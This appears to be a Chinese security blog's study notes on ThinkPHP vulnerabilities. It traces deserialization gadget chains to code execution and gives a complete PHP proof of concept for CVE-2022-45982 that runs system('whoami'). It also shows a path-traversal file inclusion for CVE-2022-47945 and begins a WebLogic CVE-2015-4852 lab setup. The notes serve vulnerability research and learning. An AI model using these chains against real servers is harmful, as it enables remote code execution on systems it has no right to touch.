<p>在unserialize打断点,进入调试<br>首先是Psr6Cache.php的父类的AbstractCache.php的<code>__destruct()</code>方法:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个autosave可控,设置为false进入Psr6Cache.php的save()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215130745.png" alt="image.png"><br>这里的pool变量也可控,可以调用任意一个对象的<code>__call</code>方法,这里我们选择的是<code>think\log\Channel</code>对象<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215130906.png" alt="image.png"><br>然后是调用log()方法,$method就是函数名getItem(这里没啥用),然后调用record()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215131030.png" alt="image.png"><br>直接走到if语句,这里<code>$this-&gt;lazy</code>我们可控,直接设置为false就可以进入if语句调用save()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215131340.png" alt="image.png"><br>走到if语句,我们可以控制logger的值,这里设置为<code>think\log\driver\Socket()</code>对象,然后调用<code>think\log\driver\Socket()::save()</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215131525.png" alt="image.png"></p>
<p>这里先执行check()函数:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215131550.png" alt="image.png"><br>我们想要check函数返回true需要设置<code>config[&#39;force_client_ids&#39;]</code>为true,<code>config[&#39;allow_client_ids&#39;]</code>是空<br>然后回到save()方法,需要设置<code>config[&#39;debug&#39;]</code>为true,然后if语句判断<code>if ($this-&gt;app-&gt;exists(&#39;request&#39;))</code><br>这里我们将<code>$this-&gt;app</code>设置为<code>\think\App</code>,而这个类没有exists方法,会调用父类Container.php的exists()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215131946.png" alt="image.png"><br>跟进getAlias()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215132028.png" alt="image.png"><br>注释告诉我们根据别名获取真实类名,这里是<code>\think\Request</code>,调试可以发现<code>$this-&gt;bind</code>就是<code>\think\App</code>的bind变量,里面设置了键request的值为<code>Request::class</code>,这里$bind被赋值了<code>\think\Request</code>,重新进入getAlias()函数没有进入if语句直接返回了<code>\think\Request</code>,而出来后的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return isset($this-&gt;instances[$abstract])</span><br></pre></td></tr></table></figure><br>返回为true,因为我们自定义了<code>\think\App</code>的instances变量,在Poc里可以发现,为<code>new Request()</code><br>然后回到Socket.php的save()方法接着走,调用Request的url方法,这个Request对象也被我们重写了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215133129.png" alt="image.png"><br>调用domain方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215133147.png" alt="image.png"><br>最后返回<code>http://&lt;?php system(&#39;calc&#39;); exit(); ?&gt;</code><br>$currentUri变量的值为<code>http://&lt;?php system(&#39;calc&#39;); exit(); ?&gt;</code><br>而后判断<code>config[&#39;format_head&#39;]</code>,执行invoke函数<br>这里设置的<code>config[&#39;format_head&#39;]</code>为数组: <code>[new \think\view\driver\Php,&#39;display&#39;]</code><br>App.php没有invoke方法,调用父类Container.php的:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215133458.png" alt="image.png"><br>这里直接会走到invokeMethod方法,$callable是数组<code>[new \think\view\driver\Php,&#39;display&#39;]</code>$vars<code>是一维数组:</code>http://&lt;?php system(‘calc’); exit(); ?&gt;<code>![image.png](https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215133657.png)
先把$method分开键值对,即</code>class为\think\view\driver\Php,method为display<code>,生成reflect反射对象
最后调用</code>$reflect-&gt;invokeArgs()方法`,走到Php.php的display方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215134038.png" alt="image.png"><br>完成RCE<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240215134111.png" alt="image.png"></p>
<h2 id="CVE-2022-45982"><a href="#CVE-2022-45982" class="headerlink" title="CVE-2022-45982"></a>CVE-2022-45982</h2><h3 id="范围-3"><a href="#范围-3" class="headerlink" title="范围"></a>范围</h3><p>ThinkPHP 6.0.0~6.0.13 和 6.1.0~6.1.1 </p>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>入口点是<code>abstract class Model</code>的__destruct()方法<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>进入save()方法之后<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;setAttrs($data);</span><br></pre></td></tr></table></figure><br>直接进入Attribute.php的setAttrs()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220001141.png" alt="image.png"><br>直接返回没啥用<br>在<code>$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code>这里会进入updateData()方法,我们设置了<code>$this-&gt;exists</code>为true<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220001413.png" alt="image.png"><br>这里我们需要进入<code>$this-&gt;getChangedData()</code>方法,因为里面涉及一些数组删除操作使我们能进入下面的if语句<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220001547.png" alt="image.png"><br><code>$data</code>是我们可控的<code>$this-&gt;data</code>,我们设置为<code>[&#39;a&#39; =&gt; &#39;b&#39;]</code><br><code>$this-&gt;readonly</code>我们设置好为<code>[&#39;a&#39;]</code><br>经过if判断,删掉了<code>$data</code>的内容,此时<code>$data</code>为空<br>回来Model.php正好进入if语句,调用<code>$this-&gt;autoRelationUpdate()</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220002234.png" alt="image.png"><br>我们可控<code>($this-&gt;relationWrite</code>的内容,设置为一个二维数组<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;r&#x27; =&gt;  </span><br><span class="line">    [&quot;n&quot; =&gt; $value]  </span><br><span class="line">]</span><br><span class="line">value是一个think\route\Url类型的对象</span><br></pre></td></tr></table></figure><br>调用到<code>$model = $this-&gt;getRelation($name, true);</code><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220002551.png" alt="image.png"><br>我们控制<code>$this-&gt;relation = [&#39;r&#39; =&gt; $this];</code>,<code>$this</code>为本Pivot对象<br>然后可以进入if语句调用<code>$model-&gt;exists(true)-&gt;save($val);</code>,此时<code>$val</code>是被键值对分出的值,一维数组<code>[&quot;n&quot; =&gt; $value]</code></p>
<p>然后就调用的Model的save()方法,这个危险方法应该很敏感了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220002956.png" alt="image.png"><br>此时的<code>$data</code>是一个<code>\think\route\Url</code>对象了<br>进入setAttrs()-&gt;Attribute.setAttrs()-&gt;<code>$this-&gt;setAttr()</code><br>目标是拼接字符串,我们需要设置<code>$this-&gt;origin = [&quot;n&quot; =&gt; $value];</code><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220003215.png" alt="image.png"><br>去调用<code>Url.__toString()</code>方法-&gt;build()<br>然后走到我们常见的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$bind = $this-&gt;route-&gt;getDomainBind($domain &amp;&amp; is_string($domain) ? $domain : null);</span><br></pre></td></tr></table></figure><br><code>$this-&gt;route</code>被设置为<code>think\log\Channel</code>对象,调用它的<code>__call</code>-&gt;log(-&gt;record()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220003700.png" alt="image.png"><br>我们自定义lazy变量为false进入save()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220003735.png" alt="image.png"><br>调用<code>$this-&gt;logger-&gt;save</code>-&gt;Store.php的save()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220003813.png" alt="image.png"><br>熟悉的serialize()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220003910.png" alt="image.png"><br>熟悉的RCE<br>我们可控Store.php的一些变量<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected $serialize = [&quot;call_user_func&quot;];</span><br><span class="line">$this-&gt;data = [$data, &quot;param&quot;];</span><br><span class="line">$data是think\Request()实例</span><br></pre></td></tr></table></figure><br>调用的<code>call_user_func($this-&gt;data)</code><br>去了Request的param()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004120.png" alt="image.png"></p>
<p>进入input()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004219.png" alt="image.png"><br>先进入getFilter()获取<code>$this-&gt;filter</code>,用逗号分割开成数组,在加了一个null(<code>$default</code>)<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004435.png" alt="image.png"></p>
<p>然后进入filterValue()方法调用<code>call_user_func($filter, $value)</code></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004541.png" alt="image.png"></p>
<p>我们自定义的request<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected $mergeParam = true;  </span><br><span class="line">protected $param = [&quot;whoami&quot;];  </span><br><span class="line">protected $filter = &quot;system&quot;;</span><br></pre></td></tr></table></figure><br>最终RCE<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004711.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240220004720.png" alt="image.png"></p>
<h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">true</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$readonly</span> = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$relationWrite</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$origin</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;relation = [<span class="string">&#x27;r&#x27;</span> =&gt; <span class="variable language_">$this</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;origin = [<span class="string">&quot;n&quot;</span> =&gt; <span class="variable">$value</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;relationWrite = [<span class="string">&#x27;r&#x27;</span> =&gt;</span><br><span class="line">                [<span class="string">&quot;n&quot;</span> =&gt; <span class="variable">$value</span>]</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">App</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$request</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mergeParam</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [<span class="string">&quot;whoami&quot;</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">route</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">App</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Url</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$url</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$domain</span> = <span class="string">&quot;domain&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$route</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$route</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;route = <span class="variable">$route</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="keyword">new</span> <span class="title class_">App</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">log</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Channel</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">lazy</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$logger</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$log</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Store</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$serialize</span> = [<span class="string">&quot;call_user_func&quot;</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$id</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="variable">$data</span>, <span class="string">&quot;param&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">request</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Request</span>();         <span class="comment">//  param</span></span><br><span class="line">    <span class="variable">$store</span> = <span class="keyword">new</span> think\session\<span class="title function_ invoke__">Store</span>(<span class="variable">$request</span>);     <span class="comment">// save</span></span><br><span class="line">    <span class="variable">$channel</span> = <span class="keyword">new</span> think\log\<span class="title function_ invoke__">Channel</span>(<span class="variable">$store</span>);     <span class="comment">// __call</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="keyword">new</span> think\route\<span class="title function_ invoke__">Url</span>(<span class="variable">$channel</span>);   <span class="comment">// __toString</span></span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$url</span>);   <span class="comment">// __destruct</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$model</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2022-47945"><a href="#CVE-2022-47945" class="headerlink" title="CVE-2022-47945"></a>CVE-2022-47945</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h3><p>thinkphp&lt;=6.0.13</p>
<h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h3><h4 id="thinkphp6-0-12"><a href="#thinkphp6-0-12" class="headerlink" title="thinkphp6.0.12"></a>thinkphp6.0.12</h4><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.12 tp6</span><br></pre></td></tr></table></figure>
<p>注意由于composer在安装时一些依赖的更新导致此时的tp6不是6.0.12而是6.1.4,因此我们需要手动修改composer.json的require的内容:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=7.2.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.0.12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-orm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><br>重新执行composer install即可</p>
<h5 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h5><p>这里环境是Windows+phpstorm调试<br>phpstorm打开tp6文件夹,添加一个PHP内置Web服务器的运行配置文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214222111.png" alt="image.png"><br>然后修改app/middleware.php的内容,把多语言加载的注释给删了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    \think\middleware<span class="title class_">\LoadLangPack</span>::<span class="variable language_">class</span>,</span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    <span class="comment">// \think\middleware\SessionInit::class</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
<p>由于我们调试的是任意文件包含,我们在public目录写一个test.php以便调试<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p>跳转<code>\think\middleware\LoadLangPack</code>,下断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214222325.png" alt="image.png"></p>
<p>url: <a href="http://localhost:1221/public?lang=../../../../../public/test">http://localhost:1221/public?lang=../../../../../public/test</a><br>开启调试:<br>首先会调用detect函数来依次遍历get,请求头和cookie是否有lang参数,也就是<code>$this-&gt;config[&#39;detect_var&#39;]</code>内置变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214222720.png" alt="image.png"></p>
<p>先小写一遍赋值给$langSet变量<br>而后由于<code>$this-&gt;config[&#39;allow_lang_list&#39;]</code>变量默认是空的进入if语句将<code>$langSet</code>赋值给<code>$range</code>变量,而后调用setLangSet()函数将Lang.php的private属性的$range变量赋值从默认的zh-cn改为../../../../../public/test<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214223159.png" alt="image.png"></p>
<p>然后会比较当前langset变量是否等于默认的”zh-cn”,不等于进入if语句,调用<code>switchLangSet()</code>函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214223618.png" alt="image.png"><br>然后调用load()函数,参数是个只有一个值的数组,<code>$this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;</code>值为<code>D:\phpstudy_pro\WWW\think\vendor\topthink\framework\src\lang\../../../../../public/test.php</code><br>这里就是我们的目标文件地址<br>进入load()函数:<br>参数file就是这个目标文件地址,通过一个foreach循环来调用parse()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214223856.png" alt="image.png"></p>
<p>这个parse函数就是最终sink点,先pathinfo取出后缀名来判断文件类型,然后包含文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214224007.png" alt="image.png"><br>最终成功包含test.php文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240214224049.png" alt="image.png"></p>
<h4 id="thinkphp5-1"><a href="#thinkphp5-1" class="headerlink" title="thinkphp5.1"></a>thinkphp5.1</h4><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5</span><br></pre></td></tr></table></figure>
<p>默认5.1.41版本</p>
<h4 id="开启多语言"><a href="#开启多语言" class="headerlink" title="开启多语言"></a>开启多语言</h4><p>config/app.php的lang_switch_on参数改为true</p>
<p>本地没复现成功,<code>$langSet = $this-&gt;range</code>这一步将langSet值设置为了zh-cn</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.kancloud.cn/manual/thinkphp5/118031">https://www.kancloud.cn/manual/thinkphp5/118031</a></li>
<li><a href="https://www.freebuf.com/vuls/185415.html">天融信关于ThinkPHP 5.1.x SQL注入漏洞分析 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/652094569">https://zhuanlan.zhihu.com/p/652094569</a></li>
<li><a href="https://github.com/top-think/framework/issues/2561">v6.0.8 中的 PHP 反序列化漏洞 ·期号 #2561 ·top-think/框架 ·GitHub上</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/652094569">https://zhuanlan.zhihu.com/p/652094569</a></li>
<li><a href="https://tttang.com/archive/1865/">https://tttang.com/archive/1865/</a></li>
</ul>
]]></content>
      <categories>
        <category>thinkphp</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic学习1&amp;&amp;CVE-2015-4852分析</title>
    <url>/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>weblogic下载链接: <a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a><br>选择10.3.6的Generic版本下载<br>本地cmd执行:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -D64 -jar wls1036_generic.jar</span><br></pre></td></tr></table></figure><br>这里报错了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144058.png" alt="image.png"><br>上网查了一下发现路径不能有中文,换个目录,正常安装<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144208.png" alt="image.png"><br>一直下一步就行,安装完会自动运行quickstart<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405144650.png" alt="image.png"><br>创建新的weblogic域,这里我会报错在执行/Middleware/wlserver_10.3/common/bin/config.exe的时候无法创建jvm,把jdk版本换成jdk1.7_80重新装一次就好了<br>一直下一步,配置域的名称和位置<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405150340.png" alt="image.png"><br>配置管理员用户名和密码<br>下一步选择生产模式,jdk选择<br>下一步选受管服务器、集群和计算机<br>后面就一直下一步就行</p>
<p>安装完成后进入<code>Middleware\user_projects\domains\base_domain</code>双击运行startWebLogic.cmd,输入刚才填的用户名和密码<br>访问: <a href="http://127.0.0.1:7001/console/login/LoginForm.jsp">http://127.0.0.1:7001/console/login/LoginForm.jsp</a><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405150918.png" alt="image.png"></p>
<p>配置debug:<br>在startWebLogic.cmd文件的前面加上:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set JAVA_OPTIONS=-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=9999,server=y,suspend=n</span><br></pre></td></tr></table></figure></p>
<p>双击运行<br>观察本地9999端口<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405154934.png" alt="image.png"><br>IDEA打开wlserver文件夹作为项目,library加入<code>Middleware\wlserver_10.3\server\lib</code>文件夹,新建配置文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405155932.png" alt="image.png"><br>双击shift,搜WLSServletAdapter,在handle函数下个断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405160107.png" alt="image.png"><br>运行debug,访问: <a href="http://localhost:7001/wls-wsat/CoordinatorPortType">http://localhost:7001/wls-wsat/CoordinatorPortType</a><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405160210.png" alt="image.png"><br>成功拦截</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h3><p>它是weblogic独有的一个协议,在weblogic中对rmi的传输就是使用的T3协议<br>它包含请求头和请求体<br>eg.<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure><br>wireshark监听本地环回地址127.0.0.1:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405184736.png" alt="image.png"></p>
